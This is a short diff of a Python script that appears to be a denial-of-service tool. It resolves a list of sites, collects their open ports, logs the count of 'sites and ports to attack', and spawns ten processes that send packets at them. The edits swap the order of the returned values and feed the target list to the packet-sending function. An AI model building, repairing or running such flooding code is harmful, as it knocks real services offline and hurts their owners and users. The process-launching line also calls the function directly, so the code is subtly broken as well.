@@ -138,14 +138,14 @@ def remove_duplicates(ips):
     return clean_ip_list
 
 
-# Resolving hostnames
+# # Resolving hostnames
 ip_addresses = dns_resolve(all_sites)
-
-# Remove duplicate IPs
+#
+# # Remove duplicate IPs
 clean_ip_addresses = remove_duplicates(ip_addresses)
-
-# Create list of Opened ports and IPs
-total_targets, checked_port_nested_list = create_nested_port_ip_list(clean_ip_addresses, used_random_ports)
+#
+# # Create list of Opened ports and IPs
+checked_port_nested_list, total_targets = create_nested_port_ip_list(clean_ip_addresses, used_random_ports)
 logging.info(f"Total open sites and ports to attack: {total_targets}")
 
 
@@ -332,8 +332,9 @@ def send_packets(test_data_list):
 
 # Create multithreading job list
 process_list = []
-for i in range(10):
-    p = multiprocessing.Process(target=send_packets(test_data))
+processes_total = 10
+for i in range(processes_total):
+    p = multiprocessing.Process(target=send_packets(checked_port_nested_list))
     p.start()
     process_list.append(p)
 
